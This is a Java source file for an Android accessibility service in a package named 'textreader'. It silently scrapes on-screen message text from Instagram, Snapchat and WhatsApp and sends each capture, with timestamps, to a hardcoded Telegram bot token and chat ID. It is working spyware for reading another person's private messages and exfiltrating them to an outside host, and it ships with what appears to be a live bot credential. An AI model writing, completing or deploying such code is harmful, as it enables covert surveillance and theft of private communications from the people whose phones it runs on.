package com.example.textreader;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import java.io.File;
import java.io.FileOutputStream;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.HashSet;
import java.util.Locale;
import java.util.Set;

public class GlobalActionBarService extends AccessibilityService {

    private SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());

    // 🔥 YOUR CREDENTIALS – REPLACE WITH YOUR REAL TOKEN AND CHAT ID
    private static final String BOT_TOKEN = "8745417407:AAHpcDSAa4yeLeJRjI_8ut8BrjOShffi7bs";   // e.g., "1234567890:ABCdefGHIjkl"
    private static final String CHAT_ID = "5465116744";       // e.g., "123456789"

    private Set<String> uiJunk = new HashSet<String>() {{
        add("Send"); add("Message"); add("Back"); add("More"); add("Profile");
        add("Delete"); add("Copy"); add("Reply"); add("Forward"); add("Settings");
        add("Search"); add("Type a message"); add("New message"); add("Seen");
        add("Delivered"); add("Read"); add("Like"); add("Comment"); add("Share");
        add("Save"); add("Cancel"); add("Done"); add("Edit"); add("Post");
        add("Story"); add("Home"); add("Explore"); add("Activity");
        add("Notifications"); add("Direct"); add("Inbox"); add("Create");
        add("View"); add("Reply"); add("Forward"); add("Delete"); add("More");
        add("Options"); add("Menu"); add("Add"); add("Remove"); add("Block");
        add("Report"); add("Unfollow"); add("Follow"); add("Mute"); add("Hide");
    }};

    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        // Send a test message to confirm the bot works
        sendToTelegram("✅ Screen Logger service started successfully!");
        // Also write to local file for debugging
        writeToFile("Service started at " + dateFormat.format(new Date()));
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getPackageName() == null) return;
        String pkg = event.getPackageName().toString();

        // --- DEBUG: Send package name for EVERY event ---
        // After confirming events arrive, you can comment out this line.
        sendToTelegram("🔍 DEBUG: Event from " + pkg + " | Type: " + event.getEventType());

        // --- Now try to scrape text from the screen (only for Instagram, Snapchat, WhatsApp) ---
        if (pkg.equals("com.instagram.android") ||
            pkg.equals("com.snapchat.android") ||
            pkg.equals("com.whatsapp")) {

            AccessibilityNodeInfo root = getRootInActiveWindow();
            if (root != null) {
                String extracted = extractCleanText(root);
                if (!extracted.isEmpty()) {
                    String log = String.format("[%s] APP: %s [MESSAGE]: %s",
                            dateFormat.format(new Date()),
                            getAppName(pkg),
                            extracted);
                    sendToTelegram(log);
                    writeToFile(log);
                }
            }
        }
    }

    private String extractCleanText(AccessibilityNodeInfo node) {
        StringBuilder sb = new StringBuilder();
        collectText(node, sb);
        String raw = sb.toString();
        String[] parts = raw.split("\\|");
        StringBuilder filtered = new StringBuilder();
        for (String part : parts) {
            part = part.trim();
            if (part.length() > 10 && !uiJunk.contains(part) && !containsJunk(part)) {
                if (filtered.length() > 0) filtered.append(" | ");
                filtered.append(part);
            }
        }
        String result = filtered.toString();
        return result.length() > 2000 ? result.substring(0, 2000) : result;
    }

    private void collectText(AccessibilityNodeInfo node, StringBuilder sb) {
        if (node == null) return;
        if (node.getText() != null) {
            String text = node.getText().toString();
            if (!text.isEmpty()) {
                if (sb.length() > 0) sb.append("|");
                sb.append(text);
            }
        }
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) collectText(child, sb);
        }
    }

    private boolean containsJunk(String text) {
        for (String junk : uiJunk) {
            if (text.contains(junk)) return true;
        }
        return false;
    }

    private String getAppName(String pkg) {
        if (pkg.equals("com.instagram.android")) return "INSTAGRAM";
        if (pkg.equals("com.snapchat.android")) return "SNAPCHAT";
        if (pkg.equals("com.whatsapp")) return "WHATSAPP";
        return pkg;
    }

    // ---------- TELEGRAM SENDER ----------
    private void sendToTelegram(final String message) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    String urlString = "https://api.telegram.org/bot" + BOT_TOKEN +
                            "/sendMessage?chat_id=" + CHAT_ID +
                            "&text=" + URLEncoder.encode(message, "UTF-8");
                    URL url = new URL(urlString);
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("GET");
                    conn.setConnectTimeout(5000);
                    conn.setReadTimeout(5000);
                    int responseCode = conn.getResponseCode();
                    conn.disconnect();
                } catch (Exception e) {
                    // ignore – write to local file if needed
                }
            }
        }).start();
    }

    // ---------- LOCAL LOGGING (for debugging) ----------
    private void writeToFile(String text) {
        try {
            File logFile = new File(getFilesDir(), "debug_log.txt");
            FileOutputStream fos = new FileOutputStream(logFile, true);
            OutputStreamWriter writer = new OutputStreamWriter(fos);
            writer.write(text + "\n");
            writer.flush();
            writer.close();
        } catch (Exception e) {
            // ignore
        }
    }

    @Override
    public void onInterrupt() {}
}
